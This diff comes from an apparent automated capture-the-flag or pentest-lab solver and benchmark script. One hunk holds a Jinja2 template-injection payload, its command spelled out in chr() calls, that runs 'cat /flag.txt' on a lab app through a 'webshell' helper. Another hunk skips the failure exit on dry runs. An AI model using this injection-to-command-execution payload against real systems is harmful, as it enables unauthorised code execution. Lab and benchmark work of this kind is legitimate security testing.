@@ -376,7 +376,7 @@ print("F13=" + (m13.group() if m13 else "NOT_FOUND"))
 
 # SSTI payload using chr() to avoid shell quoting issues
 ssti = "{{{{request.application.__globals__.__builtins__.__import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()}}}}"
-f14_raw = webshell(f"curl -s 'http://mbptl-app:5000/?name={ssti}'")
+f14_raw = webshell(f"curl -s 'http://mbptl-app:5000/?name={{ssti}}'")
 m14 = re.search(r"MBPTL-14{{[^}}]+}}", f14_raw)
 print("F14=" + (m14.group() if m14 else "NOT_FOUND"))
 PYEOF
@@ -594,7 +594,7 @@ def run_bench(
     out.write_text(json.dumps(results, indent=2))
     print(f"Results → {out}")
 
-    if any(pr["fail"] > 0 for pr in results["phases"].values()):
+    if not dry_run and any(pr["fail"] > 0 for pr in results["phases"].values()):
         sys.exit(1)
 
 
